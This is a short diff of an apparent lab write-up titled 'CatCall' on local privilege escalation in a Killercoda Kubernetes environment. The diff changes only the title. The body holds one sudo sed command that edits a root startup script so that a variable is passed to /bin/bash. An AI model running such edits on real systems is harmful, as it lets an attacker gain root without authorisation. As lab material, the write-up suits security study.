@@ -1,4 +1,4 @@
-# CatCall - Local Privilege Escalation via Script Editing
+# CatCall - Local Privilege Escalation via Script Editing (Killercoda - Kubernetes)
 
 # Add double quotes to print $1, so it passes to /bin/bash
 sudo sed -i 's/awk \x27{print $1}\x27/awk "{print $TARGET}"/g' /root/.config/xfce_custom/startup_script.sh
